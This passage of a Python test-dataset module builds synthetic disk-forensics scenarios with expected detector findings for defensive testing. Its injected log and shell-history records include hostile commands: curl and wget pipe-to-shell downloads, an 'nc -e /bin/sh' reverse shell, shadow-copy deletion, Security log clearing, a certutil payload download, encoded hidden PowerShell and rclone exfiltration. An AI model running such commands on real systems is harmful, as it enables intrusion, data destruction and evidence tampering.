# ruff: noqa: E501 - hand-written synthetic records and labels, one per line
"""The labelled disk scenario set (M9 phase 6): every scenario is one benign baseline
(`dataset.baselines`) plus injected records, with its expected findings and IOCs written next to
the records that should produce them. Built in memory at test time (`generate.build(name)`);
`python -m dataset.generate --out DIR` writes them as `disk.v1` record files.

Synthetic data only: no image, no real host; external addresses come from the RFC 5737
documentation ranges and the secrets in command lines are made up (`Scenario.secrets`, so the
quality test proves none reaches a shared surface unmasked).

Labels: a finding matches on (method, type, subject) and, when given, severity; `subject` is the
finding's `subject` attribute (the path, address, account, service, `<evidence>:<patterns>` or
`window:<time>` the finding is about). Positives are spaced more than 10 minutes apart so that
only the correlations a scenario labels arise.
"""

from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta

from dataset import records as r
from dataset.baselines import (
    DEFENDER_DEFS,
    DEFENDER_PLATFORM,
    EVENTLOG,
    SCM,
    SECURITY,
    Draft,
    baseline,
)
from disk_worker.detections.base import TEMPLATES

DAY6 = r.ts("2026-10-06T00:00:00")
SEVERITY_MAP = {
    "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Overlay": "medium",
    "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Resource": "medium",
    "test.cyberlab_test.CyberLab_Test_Marker": "medium",
    "image.operator_rules.Operator_Note_Writer": "high",
}
NTFS = r.NTFS_PARTITION
EXT = r.EXT_PARTITION


@dataclass(frozen=True)
class Expect:
    type: str
    subject: str
    severity: str | None = None

    @property
    def method(self) -> str:
        return TEMPLATES[self.type][0]


@dataclass(frozen=True)
class IocLabel:
    type: str
    value: str
    source: str | None = None


@dataclass
class Scenario:
    name: str
    baseline: str
    kind: str  # baseline | positive | hard_negative
    description: str
    mutate: Callable[[Draft], None]
    expect: list[Expect] = field(default_factory=list)
    iocs: list[IocLabel] = field(default_factory=list)
    secrets: list[str] = field(default_factory=list)


def slot(i: int, start: datetime = DAY6) -> datetime:
    """Positive number i: 40 minutes apart (never inside one correlation window)."""
    return start + timedelta(minutes=40 * i)


def _sha256(d: Draft, path: str, stream: str | None = None) -> str:
    for f in d.files:
        if f.path == path and f.stream == stream and f.sha256:
            return f.sha256
    raise KeyError(path)


def _nothing(d: Draft) -> None:
    del d


# --- file rules -------------------------------------------------------------------------------

EXEC_WINDOWS = (
    "Users/alice/AppData/Local/Temp/svchost32.exe",
    "Users/alice/AppData/Local/Temp/7zS1A2B/setup.exe",
    "Users/alice/Downloads/putty.exe",
    "Users/Public/Libraries/libupd.dll",
    "ProgramData/syncsvc.exe",
    "ProgramData/Intel/igfxupd.exe",
    "Windows/Temp/tmp4F2A.exe",
    "$Recycle.Bin/S-1-5-21-1-2-3-1104/$RAB12CE.exe",
    "Users/alice/AppData/Local/Temp/runtime.dll",
)
EXEC_KNOWN_GOOD = "Users/bob/Downloads/tool.exe"  # in a reference set: still a finding (RT18)


def _exec_windows(d: Draft) -> None:
    for i, path in enumerate(EXEC_WINDOWS):
        d.add_file(NTFS, path, magic="pe", size=180_224 + i, mtime=slot(i))
    d.add_file(
        NTFS,
        EXEC_KNOWN_GOOD,
        magic="pe",
        mtime=slot(len(EXEC_WINDOWS)),
        known="good",
        known_set="nsrl-minimal",
    )


EXEC_LINUX = (
    "tmp/.x/miner",
    "var/tmp/kworker",
    "dev/shm/.s",
    "home/alice/.local/bin/agent",
    "home/alice/.config/updater/upd",
)


def _exec_linux(d: Draft) -> None:
    for i, path in enumerate(EXEC_LINUX):
        d.add_file(EXT, path, magic="elf", size=2_400_000 + i, mtime=slot(i))


DOUBLE_NAMES = (
    "Users/alice/Documents/invoice.pdf.exe",
    "Users/alice/Documents/scan.jpg.scr",
    "Users/alice/Desktop/payment.docx.js",
    "Users/alice/Desktop/photo.png      .exe",
    "Users/alice/Documents/Q3 report.xlsx.bat",
    "Users/alice/Documents/contract.pdf.hta",
    "Users/alice/Documents/notes.txt.vbs",
    "Users/alice/Documents/archive.zip.exe",
)
RTLO_NAMES = (
    "Users/alice/Documents/report\u202efdp.exe",
    "Users/alice/Desktop/invoice\u202excod.scr",
)
DOUBLE_DELETED = "Users/alice/Documents/old/statement.pdf.exe"
RTLO_SHOWN = tuple(p.replace(chr(0x202E), "<U+202E>") for p in RTLO_NAMES)  # as findings show them


def _double(d: Draft) -> None:
    for i, path in enumerate((*DOUBLE_NAMES, *RTLO_NAMES)):
        magic = "pe" if path.endswith((".exe", ".scr")) else "script"
        d.add_file(NTFS, path, magic=magic, mtime=slot(i))
    d.add_file(NTFS, DOUBLE_DELETED, deleted=True, mtime=slot(12))


MISMATCH_WINDOWS = (
    "Users/alice/Documents/holiday.jpg",
    "Users/alice/Documents/readme.txt",
    "Users/alice/AppData/Roaming/cache.dat",
    "Users/alice/Documents/budget2.xlsx",
    "Users/alice/Documents/report.pdf",
    "Users/alice/AppData/Roaming/Vendor/config.ini",
    "Users/alice/Documents/slides2.pptx",
    "Users/alice/Music/song.mp3",
)
MISMATCH_LINUX = ("home/alice/Documents/photo.png", "opt/app/data.json", "srv/www/index.html")


def _mismatch_windows(d: Draft) -> None:
    for i, path in enumerate(MISMATCH_WINDOWS):
        d.add_file(NTFS, path, magic="pe", mtime=slot(i))


def _mismatch_linux(d: Draft) -> None:
    for i, path in enumerate(MISMATCH_LINUX):
        d.add_file(EXT, path, magic="elf", mtime=slot(i))


ADS_STREAMS = (
    ("Users/alice/Documents/notes2.txt", "payload"),
    ("Users/alice/Documents/report.docx", "svc.exe"),
    ("Users/alice/Desktop/todo.txt", "hidden"),
    ("Users/bob/Documents/plan.docx", "x.dll"),
    ("Windows/System32/drivers/etc/hosts", "upd"),
    ("ProgramData/Microsoft/Crypto/RSA/keys.dat", "loader"),
    ("Users/alice/Pictures/cat.jpg", "a"),
    ("Users/Public/Documents/readme.txt", "main"),
    ("Program Files/Acme/Backup Agent/config.xml", "bin"),
    ("Users/alice/AppData/Roaming/Vendor/state.json", "stage2"),
)


def _ads(d: Draft) -> None:
    for i, (path, stream) in enumerate(ADS_STREAMS):
        host = d.add_file(NTFS, path, magic="other", mtime=slot(i))
        d.add_file(
            NTFS, path, magic="pe", size=73_728, stream=stream, mtime=slot(i), addr=host.meta_addr
        )
    # never a finding: a Zone.Identifier stream whatever its content
    host = d.add_file(NTFS, "Users/alice/Downloads/odd.pdf", magic="document", mtime=slot(11))
    d.add_file(
        NTFS,
        host.path,
        magic="pe",
        size=26,
        stream="Zone.Identifier",
        mtime=slot(11),
        addr=host.meta_addr,
    )


# --- persistence --------------------------------------------------------------------------------

HKCU_RUN = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
HKLM_RUNONCE = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
POLICY_RUN = (
    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
)
STARTUP = "Users/alice/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
ALL_STARTUP = "ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"


def _persistence_windows(d: Draft) -> None:
    d.add_run_key(slot(0), HKCU_RUN, ["sync: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe"])
    d.add_run_key(
        slot(1),
        HKLM_RUNONCE,
        ['init: "C:\\Users\\Public\\Libraries\\init.exe" /quiet --password=Sup3rS3cretPw'],
        "Windows/System32/config/SOFTWARE",
    )
    # a generic key/value event with the value only in Plaso's message
    d.add_event(
        slot(2),
        "registry_user",
        "windows:registry:key_value",
        "Users/alice/NTUSER.DAT",
        f"[{HKCU_RUN}] helper: rundll32.exe C:\\ProgramData\\helper.dll,Start",
        {"key_path": HKCU_RUN},
        parser="winreg",
        ts_desc="Last Written Time",
    )
    d.add_run_key(slot(3), POLICY_RUN, ["svc: %TEMP%\\svc.exe"])
    d.add_service_key(slot(4), "WinUpdSvc", "C:\\Windows\\Temp\\winupd.exe")
    d.add_service_key(slot(5), "SyncHost", '"C:\\ProgramData\\SyncHost\\synchost.exe" -k sync')
    d.add_file(NTFS, f"{STARTUP}/update.exe", magic="pe", mtime=slot(6))
    d.add_file(NTFS, f"{ALL_STARTUP}/run.bat", magic="script", mtime=slot(7))
    d.add_file(NTFS, f"{STARTUP}/sync.lnk", magic="other", mtime=slot(8))
    d.add_file(NTFS, "Windows/System32/Tasks/SystemHealthCheck", mtime=slot(9))
    d.add_file(NTFS, "Windows/System32/Tasks/Microsoft/Windows/WinUpd/Refresh", mtime=slot(10))
    # Startup entries that are not findings: an old shortcut and desktop.ini (baseline)
    d.add_file(
        NTFS, f"{STARTUP}/Send to OneNote.lnk", magic="other", mtime=r.ts("2026-04-01T10:00:00")
    )


def _persistence_linux(d: Draft) -> None:
    d.add_file(EXT, "etc/cron.d/sysupdate", mtime=slot(0))
    d.add_file(EXT, "var/spool/cron/crontabs/www-data", mtime=slot(1))
    d.add_file(EXT, "etc/systemd/system/dbus-helper.service", mtime=slot(2))
    d.add_file(EXT, "home/alice/.config/systemd/user/agent.service", mtime=slot(3))
    d.add_file(EXT, "etc/rc.local", magic="script", size=212, mtime=r.ts("2026-06-01T10:00:00"))
    d.add_file(EXT, "etc/ld.so.preload", size=32, mtime=slot(5))
    # root's authorized_keys rewritten inside the window (replaces the baseline's old one)
    d.files = [f for f in d.files if f.path != "root/.ssh/authorized_keys"]
    d.add_file(EXT, "root/.ssh/authorized_keys", size=1_160, mtime=slot(6))
    for k in range(5):
        d.add_syslog(
            slot(7) + timedelta(hours=k),
            "CRON",
            "(root) CMD (/tmp/.x/miner -B --url=stratum+tcp://198.51.100.30:3333)",
            path="var/log/syslog",
            artifact="syslog",
        )
    d.add_event(
        slot(9),
        "syslog",
        "syslog:cron:task_run",
        "var/log/syslog",
        "Cron ran: /bin/sh -c /dev/shm/.k/run.sh",
        {"command": "/bin/sh -c /dev/shm/.k/run.sh", "username": "www-data"},
        part=EXT,
        parser="syslog/cron",
    )


# --- log clearing -------------------------------------------------------------------------------


def _log_cleared_windows(d: Draft) -> None:
    for i in range(4):
        d.add_evtx(slot(i), EVENTLOG, 1102, r.log_cleared_strings("admin"))
    d.add_evtx(slot(4), EVENTLOG, 104, r.channel_cleared_strings("System"), "System")
    d.add_evtx(slot(5), EVENTLOG, 104, r.channel_cleared_strings("Application"), "System")
    d.add_evtx(slot(6), EVENTLOG, 104, r.channel_cleared_strings("Windows PowerShell"), "System")
    # an unknown string layout: the clearing still counts, its account is unknown
    d.add_evtx(slot(7), EVENTLOG, 1102, ["admin"])


def _log_cleared_linux(d: Draft) -> None:
    d.files = [f for f in d.files if f.path not in ("var/log/auth.log", "var/log/wtmp")]
    d.add_file(EXT, "var/log/auth.log", size=0, magic="empty", mtime=slot(0))
    d.add_file(EXT, "var/log/wtmp", size=1_000, mtime=slot(1))


def _wtmp_emptied(d: Draft) -> None:
    d.files = [f for f in d.files if f.path != "var/log/wtmp"]
    d.add_file(EXT, "var/log/wtmp", size=0, magic="empty", mtime=slot(0))


# --- services, accounts, logons, dual use --------------------------------------------------------

SERVICES = (
    ("RemSvc", "C:\\Users\\alice\\AppData\\Local\\Temp\\remsvc.exe", "medium"),
    ("Svc32", "%SystemRoot%\\Temp\\svc32.exe", "medium"),
    ("SvcHelper", "C:\\ProgramData\\svchelper.exe", "medium"),
    ("PublicSvc", '"C:\\Users\\Public\\svc.exe" -run', "medium"),
    ("DrvLoad", "\\??\\C:\\Windows\\Temp\\drv.sys", "medium"),
    ("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe", "low"),
    ("AgentSvc", "C:\\Tools\\agent\\agent.exe", "low"),
    ("SyncSvc", "C:\\Users\\alice\\AppData\\Roaming\\Sync\\syncsvc.exe", "low"),
    ("abcdef", "cmd.exe /c echo abcdef > \\\\.\\pipe\\abcdef", "low"),
    ("RunSvc", "D:\\svc\\run.exe", "low"),
)


def _services(d: Draft) -> None:
    for i, (name, image, _) in enumerate(SERVICES):
        d.add_evtx(slot(i), SCM, 7045, r.service_strings(name, image), "System")
    # reinstalled twice more: the same finding, three cited events
    for k in (1, 2):
        d.add_evtx(
            slot(5) + timedelta(minutes=k),
            SCM,
            7045,
            r.service_strings("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"),
            "System",
        )
    # an unknown layout: skipped and counted, never guessed
    d.add_evtx(slot(11), SCM, 7045, ["Odd", "C:\\Users\\Public\\odd.exe"], "System")


def _accounts_windows(d: Draft) -> None:
    d.add_evtx(slot(0), SECURITY, 4720, r.user_created_strings("backup_svc"))
    d.add_evtx(slot(1), SECURITY, 4722, r.user_enabled_strings("backup_svc"))
    d.add_evtx(slot(2), SECURITY, 4720, r.user_created_strings("support"))
    d.add_evtx(slot(3), SECURITY, 4732, r.group_member_strings("-", "Administrators"))
    d.add_evtx(
        slot(4),
        SECURITY,
        4732,
        r.group_member_strings("CN=helpdesk,OU=Staff,DC=corp,DC=example", "Remote Desktop Users"),
    )
    d.add_evtx(
        slot(5),
        SECURITY,
        4728,
        r.group_member_strings("CN=ops2,OU=Staff,DC=corp,DC=example", "Domain Admins"),
    )


def _accounts_linux(d: Draft) -> None:
    d.add_syslog(
        slot(0),
        "useradd",
        "new user: name=deploy, UID=1001, GID=1001, home=/home/deploy, shell=/bin/bash, from=/dev/pts/0",
    )
    d.add_syslog(
        slot(1),
        "useradd",
        "new user: name=toor, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0",
    )
    d.add_syslog(slot(2), "usermod", "add 'deploy' to group 'sudo'")
    d.add_syslog(slot(2) + timedelta(seconds=1), "usermod", "add 'deploy' to shadow group 'sudo'")
    d.add_syslog(slot(3), "gpasswd", "user deploy added by root to group adm")


def _logons_windows(d: Draft) -> None:
    d.add_evtx(slot(0), SECURITY, 4624, r.logon_strings("alice", 10, "203.0.113.50"))
    d.add_evtx(
        slot(0) + timedelta(minutes=2), SECURITY, 4624, r.logon_strings("alice", 10, "203.0.113.50")
    )
    d.add_evtx(slot(1), SECURITY, 4624, r.logon_strings("admin", 3, "198.51.100.23"))
    d.add_evtx(slot(2), SECURITY, 4624, r.logon_strings("svc_backup", 3, "10.0.0.77"))
    d.add_evtx(slot(3), SECURITY, 4624, r.logon_strings("bob", 10, "203.0.113.51"))
    d.add_evtx(slot(4), SECURITY, 4624, r.logon_strings("alice", 3, "192.0.2.44"))
    for k in range(25):
        d.add_evtx(
            slot(5) + timedelta(seconds=19 * k),
            SECURITY,
            4625,
            r.failed_logon_strings(f"user{k % 4}", "198.51.100.66"),
        )


def _logons_linux(d: Draft) -> None:
    d.add_event(
        slot(0),
        "auth_log",
        "syslog:ssh:login",
        "var/log/auth.log",
        "Successful login of user: root from 198.51.100.7:50122 using authentication method: password ssh pid: 812",
        {
            "username": "root",
            "address": "198.51.100.7",
            "port": 50122,
            "authentication_method": "password",
        },
        part=EXT,
        parser="syslog/ssh",
    )
    d.add_syslog(slot(1), "sshd", "Accepted password for deploy from 203.0.113.9 port 50122 ssh2")
    d.add_syslog(
        slot(2),
        "sshd",
        "Accepted publickey for alice from 2001:db8::25 port 40022 ssh2: ED25519 SHA256:zyxwvutsrqponmlkjihgfedcba9876543210ZYXWVUT",
    )
    for k in range(30):
        d.add_syslog(
            slot(3) + timedelta(seconds=10 * k),
            "sshd",
            f"Failed password for {'invalid user ' if k % 2 else ''}root from 203.0.113.99 port {41000 + k} ssh2",
        )


ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def _dual_use_windows(d: Draft) -> None:
    d.add_prefetch(slot(0), "PSEXEC.EXE", "\\USERS\\ALICE\\DOWNLOADS\\PSEXEC.EXE")
    d.add_event(
        slot(1),
        "amcache",
        "windows:registry:amcache",
        "Windows/AppCompat/Programs/Amcache.hve",
        "path: c:\\tools\\procdump64.exe",
        {"full_path": "c:\\tools\\procdump64.exe"},
    )
    d.add_event(
        slot(2),
        "registry_user",
        "windows:registry:userassist",
        "Users/alice/NTUSER.DAT",
        "UserAssist entry",
        {"value_name": "C:\\Tools\\rclone.exe", "number_of_executions": 2},
    )
    d.add_event(
        slot(3),
        "registry_system",
        "windows:registry:bam",
        "Windows/System32/config/SYSTEM",
        "BAM entry",
        {"binary_path": "\\Device\\HarddiskVolume3\\Users\\Public\\nc.exe"},
    )
    for i, command in enumerate(
        (
            "wevtutil cl Security",
            "vssadmin delete shadows /all /quiet",
            "certutil -urlcache -split -f http://198.51.100.12/p.exe C:\\Users\\Public\\p.exe",
            f"powershell.exe -nop -w hidden -enc {ENCODED}",
        )
    ):
        image = command.split(" ", 1)[0]
        d.add_evtx(
            slot(4 + i),
            SECURITY,
            4688,
            r.process_strings(f"C:\\Windows\\System32\\{image}", command),
        )


def _dual_use_linux(d: Draft) -> None:
    d.add_bash(slot(0), "curl -s http://bob:Hunter2Secret@198.51.100.9/x.sh | sh")
    d.add_bash(slot(1), "nc -e /bin/sh 198.51.100.20 4444")
    d.add_bash(
        slot(2), "rclone copy /srv/data remote:bkt --token=gho_ExampleTokenValue123", user="root"
    )


# --- signatures and hash sets ------------------------------------------------------------------

YARA_FILES = (
    (
        "Program Files/Acme/Backup Agent/plugin01.dll",
        "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Overlay",
        "medium",
    ),
    (
        "Program Files/Acme/Backup Agent/plugin02.dll",
        "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Resource",
        "medium",
    ),
    ("Users/alice/Documents/tools/packer.exe", "test.cyberlab_test.CyberLab_Test_Marker", "medium"),
    ("Users/alice/Documents/tools/locker.exe", "image.operator_rules.Operator_Note_Writer", "high"),
    ("Users/alice/Documents/tools/helper.exe", "image.operator_rules.Unlisted_Rule", "low"),
    (
        "Program Files/Notepad++/plugins/x.dll",
        "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Overlay",
        "medium",
    ),
    (
        "Program Files/7-Zip/7z-extra.dll",
        "image.cyberlab_baseline.CyberLab_Embedded_PE_In_Resource",
        "medium",
    ),
    ("Users/bob/Documents/game.exe", "test.cyberlab_test.CyberLab_Test_Marker", "medium"),
    ("Users/bob/Documents/keygen.exe", "image.operator_rules.Unlisted_Rule", "low"),
)


def _yara(d: Draft) -> None:
    for i, (path, rule, _) in enumerate(YARA_FILES):
        rules = [rule]
        if i == 0:
            rules.append("test.cyberlab_test.CyberLab_Test_Marker")
        d.add_file(NTFS, path, magic="pe", mtime=slot(i), yara=rules)


HASHSET_FILES = (
    ("Users/alice/Documents/tools/mimi.exe", "bad", "operator-bad"),
    ("Users/alice/Documents/tools/dump.exe", "bad", "operator-bad"),
    ("Users/alice/Documents/tools/scan.exe", "notable", "dfir-notable"),
    ("Program Files/Acme/Backup Agent/oldlib.dll", "notable", "dfir-notable"),
    ("Users/bob/Documents/setup2.exe", "bad", "operator-bad"),
    ("Users/bob/Documents/crack.exe", "bad", "operator-bad"),
    ("Users/alice/Pictures/wallpaper.jpg", "notable", "dfir-notable"),
    ("Windows/System32/drivers/oldvuln.sys", "notable", "dfir-notable"),
    ("Users/alice/Documents/tools/tunnel.exe", "bad", "operator-bad"),
    ("Users/alice/Documents/tools/proxy.exe", "bad", "operator-bad"),
)


def _hashset(d: Draft) -> None:
    for i, (path, known, known_set) in enumerate(HASHSET_FILES):
        magic = "other" if path.endswith(".jpg") else "pe"
        d.add_file(NTFS, path, magic=magic, mtime=slot(i), known=known, known_set=known_set)


# --- correlations -------------------------------------------------------------------------------

CORR_DOUBLE = ("invoice.pdf.exe", "scan.jpg.exe", "order.docx.exe", "statement.pdf.scr")
CORR_MISMATCH = ("photo.jpg", "notes.txt")
CORR_BASE = r.ts("2026-10-05T00:00:00")


def _correlated_windows(d: Draft) -> None:
    for i, name in enumerate(CORR_DOUBLE):
        d.add_file(NTFS, f"Users/alice/Downloads/{name}", magic="pe", mtime=slot(i, CORR_BASE))
    for i, name in enumerate(CORR_MISMATCH):
        d.add_file(
            NTFS, f"Users/alice/AppData/Local/Temp/{name}", magic="pe", mtime=slot(4 + i, CORR_BASE)
        )
    # an autostart value naming a program that is in the listing (3 hours earlier)
    d.add_file(
        NTFS,
        "Users/alice/AppData/Local/Temp/upd.exe",
        magic="pe",
        mtime=slot(6, CORR_BASE) - timedelta(hours=3),
    )
    d.add_run_key(
        slot(6, CORR_BASE), HKCU_RUN, ["upd: C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe"]
    )
    # a service install and its registry key, same image path
    d.add_evtx(
        slot(8, CORR_BASE),
        SCM,
        7045,
        r.service_strings("HostSvc", "C:\\ProgramData\\svc\\host.exe"),
        "System",
    )
    d.add_service_key(
        slot(8, CORR_BASE) + timedelta(minutes=1), "HostSvc", "C:\\ProgramData\\svc\\host.exe"
    )
    # the Security log cleared, then an account created 3 minutes later
    d.add_evtx(slot(10, CORR_BASE), EVENTLOG, 1102, r.log_cleared_strings("admin"))
    d.add_evtx(
        slot(10, CORR_BASE) + timedelta(minutes=3),
        SECURITY,
        4720,
        r.user_created_strings("helpdesk2"),
    )
    # an RDP logon, then PsExec run 5 minutes later
    d.add_evtx(slot(12, CORR_BASE), SECURITY, 4624, r.logon_strings("admin", 10, "203.0.113.77"))
    d.add_prefetch(slot(12, CORR_BASE) + timedelta(minutes=5), "PSEXEC.EXE", "\\TOOLS\\PSEXEC.EXE")


def _correlated_linux(d: Draft) -> None:
    d.add_syslog(
        slot(0, CORR_BASE), "sshd", "Accepted password for root from 198.51.100.44 port 50999 ssh2"
    )
    d.add_bash(
        slot(0, CORR_BASE) + timedelta(minutes=2),
        "wget -qO- http://198.51.100.45/i.sh | bash",
        user="root",
    )


# --- hard negatives ------------------------------------------------------------------------------


def _defender_update(d: Draft) -> None:
    defs = DEFENDER_DEFS.replace("{6E1D2C4A", "{7F2E3D5B")
    for name in ("mpengine.dll", "MpKslDrv.sys"):
        d.add_file(NTFS, f"{defs}/{name}", magic="pe", mtime=slot(0))
    platform = DEFENDER_PLATFORM.replace("24090.11", "24100.3")
    for name in ("MsMpEng.exe", "MpCmdRun.exe"):
        d.add_file(NTFS, f"{platform}/{name}", magic="pe", mtime=slot(1))
    d.add_evtx(
        slot(0),
        SCM,
        7045,
        r.service_strings("MpKslDrv", f"C:\\{defs.replace('/', chr(92))}\\MpKslDrv.sys"),
        "System",
    )
    d.add_service_key(slot(1), "WinDefend", f'"C:\\{platform.replace("/", chr(92))}\\MsMpEng.exe"')


def _installer_service(d: Draft) -> None:
    d.add_file(NTFS, "Program Files/Contoso/Agent/contoso-agent.exe", magic="pe", mtime=slot(0))
    d.add_file(
        NTFS,
        "ProgramData/Package Cache/{1D2E3F40-1111-2222-3333-444455556666}/contoso-setup.exe",
        magic="pe",
        mtime=slot(0),
    )
    d.add_evtx(
        slot(0),
        SCM,
        7045,
        r.service_strings(
            "ContosoAgent", '"C:\\Program Files\\Contoso\\Agent\\contoso-agent.exe" --service'
        ),
        "System",
    )
    d.add_service_key(
        slot(0) + timedelta(seconds=5),
        "ContosoAgent",
        '"C:\\Program Files\\Contoso\\Agent\\contoso-agent.exe" --service',
    )
    d.add_file(
        NTFS,
        "Windows/Installer/{AB12CD34-0000-1111-2222-333344445555}/contoso.ico.exe",
        magic="pe",
        mtime=slot(0),
    )


def _onedrive_teams(d: Draft) -> None:
    d.add_file(
        NTFS,
        "Users/alice/AppData/Local/Microsoft/OneDrive/StandaloneUpdater/OneDriveSetup.exe",
        magic="pe",
        mtime=slot(0),
    )
    d.add_file(
        NTFS,
        "Users/alice/AppData/Local/Microsoft/OneDrive/24.190.0915.0001/FileSyncShell64.dll",
        magic="pe",
        mtime=slot(0),
    )
    d.add_file(
        NTFS,
        "Users/alice/AppData/Local/Microsoft/Teams/current/Teams.exe",
        magic="pe",
        mtime=slot(1),
    )
    d.add_run_key(
        slot(1),
        HKCU_RUN,
        [
            'OneDrive: "C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background'
        ],
    )


def _linux_admin_week(d: Draft) -> None:
    d.add_syslog(
        slot(0),
        "sudo",
        "alice : TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/usr/sbin/useradd --system svc-metrics",
    )
    d.add_syslog(
        slot(0) + timedelta(seconds=1),
        "useradd",
        "new user: name=svc-metrics, UID=997, GID=997, home=/nonexistent, shell=/usr/sbin/nologin, from=/dev/pts/1",
    )
    d.add_syslog(slot(1), "usermod", "add 'alice' to group 'video'")
    d.add_file(EXT, "lib/systemd/system/metrics.service", mtime=slot(1))
    d.add_file(EXT, "usr/bin/metrics-agent", magic="elf", mtime=slot(1))
    d.add_bash(
        slot(2), "curl -fsSL https://downloads.example.org/install.sh -o install.sh", user="alice"
    )
    d.add_bash(slot(3), "sha256sum install.sh && less install.sh", user="alice")
    d.add_bash(slot(4), "nc -zv 10.0.0.9 443", user="alice")
    d.add_bash(
        slot(5),
        "wget https://downloads.example.org/agent.deb && sudo dpkg -i agent.deb",
        user="alice",
    )


def _spread_failures(d: Draft) -> None:
    # 19 failures inside 10 minutes, then the rest spread over hours: never a burst
    for k in range(19):
        d.add_syslog(
            slot(0) + timedelta(seconds=30 * k),
            "sshd",
            "Failed password for root from 203.0.113.120 port 40000 ssh2",
        )
    for k in range(40):
        d.add_syslog(
            slot(2) + timedelta(minutes=11 * k),
            "sshd",
            "Failed password for root from 203.0.113.120 port 40001 ssh2",
        )
    d.add_syslog(
        slot(3), "sshd", "Accepted publickey for alice from ::1 port 40022 ssh2: ED25519 SHA256:q"
    )


def _empty_wtmp_alone(d: Draft) -> None:
    d.files = [f for f in d.files if not f.path.startswith("var/log/wtmp")]
    d.add_file(EXT, "var/log/wtmp", size=0, magic="empty", mtime=slot(0))


# --- the set ------------------------------------------------------------------------------------

W10, W11, DEB = "windows10_workstation", "windows11_workstation", "debian_server"
EXEC_TYPE = "disk_exec_user_writable"
PERS_REG = "disk_persistence_run_key"


def _scenarios() -> list[Scenario]:
    s: list[Scenario] = [
        Scenario(
            "windows10_workstation",
            W10,
            "baseline",
            "clean Windows 10-shaped workstation",
            _nothing,
        ),
        Scenario(
            "windows11_workstation",
            W11,
            "baseline",
            "clean Windows 11-shaped workstation with a FAT32 USB stick",
            _nothing,
        ),
        Scenario("debian_server", DEB, "baseline", "clean Debian-shaped server", _nothing),
        Scenario(
            "win_exec_user_writable",
            W10,
            "positive",
            "programs in user-writable locations, one in a reference set",
            _exec_windows,
            [Expect(EXEC_TYPE, p, "low") for p in (*EXEC_WINDOWS, EXEC_KNOWN_GOOD)],
        ),
        Scenario(
            "linux_exec_user_writable",
            DEB,
            "positive",
            "ELF files in /tmp, /var/tmp, /dev/shm and hidden home directories",
            _exec_linux,
            [Expect(EXEC_TYPE, p, "low") for p in EXEC_LINUX],
        ),
        Scenario(
            "win_double_extension",
            W11,
            "positive",
            "document-looking program names and RTLO names",
            _double,
            [Expect("disk_double_extension", p, "medium") for p in (*DOUBLE_NAMES, DOUBLE_DELETED)]
            + [Expect("disk_rtlo_name", p, "medium") for p in RTLO_SHOWN],
        ),
        Scenario(
            "win_extension_mismatch",
            W10,
            "positive",
            "PE content under data extensions",
            _mismatch_windows,
            [Expect("disk_extension_mismatch", p, "medium") for p in MISMATCH_WINDOWS],
        ),
        Scenario(
            "linux_extension_mismatch",
            DEB,
            "positive",
            "ELF content under data extensions",
            _mismatch_linux,
            [Expect("disk_extension_mismatch", p, "medium") for p in MISMATCH_LINUX],
        ),
        Scenario(
            "win_ads_executable",
            W10,
            "positive",
            "PE content in named streams (and a Zone.Identifier that never counts)",
            _ads,
            [Expect("disk_ads_executable", f"{p}:{s_}", "medium") for p, s_ in ADS_STREAMS],
        ),
        Scenario(
            "win_persistence",
            W10,
            "positive",
            "autostart values, services, Startup entries and task files",
            _persistence_windows,
            [
                Expect(PERS_REG, "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", "medium"),
                Expect(PERS_REG, "C:\\Users\\Public\\Libraries\\init.exe", "medium"),
                Expect(PERS_REG, "C:\\ProgramData\\helper.dll", "medium"),
                Expect(PERS_REG, "%TEMP%\\svc.exe", "medium"),
                Expect("disk_persistence_service", "C:\\Windows\\Temp\\winupd.exe", "medium"),
                Expect(
                    "disk_persistence_service", "C:\\ProgramData\\SyncHost\\synchost.exe", "medium"
                ),
                Expect("disk_persistence_startup", f"{STARTUP}/update.exe", "medium"),
                Expect("disk_persistence_startup", f"{ALL_STARTUP}/run.bat", "medium"),
                Expect("disk_persistence_startup", f"{STARTUP}/sync.lnk", "low"),
                Expect("disk_persistence_task", "Windows/System32/Tasks/SystemHealthCheck", "low"),
                Expect(
                    "disk_persistence_task",
                    "Windows/System32/Tasks/Microsoft/Windows/WinUpd/Refresh",
                    "low",
                ),
            ],
            secrets=["Sup3rS3cretPw"],
        ),
        Scenario(
            "linux_persistence",
            DEB,
            "positive",
            "cron, systemd, rc.local, ld.so.preload, authorized_keys and cron runs from /tmp",
            _persistence_linux,
            [
                Expect("disk_persistence_cron_file", "etc/cron.d/sysupdate", "low"),
                Expect("disk_persistence_cron_file", "var/spool/cron/crontabs/www-data", "low"),
                Expect(
                    "disk_persistence_systemd_unit", "etc/systemd/system/dbus-helper.service", "low"
                ),
                Expect(
                    "disk_persistence_systemd_unit",
                    "home/alice/.config/systemd/user/agent.service",
                    "low",
                ),
                Expect("disk_persistence_rc_local", "etc/rc.local", "low"),
                Expect("disk_persistence_ld_preload", "etc/ld.so.preload", "medium"),
                Expect("disk_persistence_authorized_keys", "root/.ssh/authorized_keys", "low"),
                Expect("disk_persistence_cron_exec", "/tmp/.x/miner", "medium"),  # noqa: S108
                Expect("disk_persistence_cron_exec", "/dev/shm/.k/run.sh", "medium"),  # noqa: S108
            ],
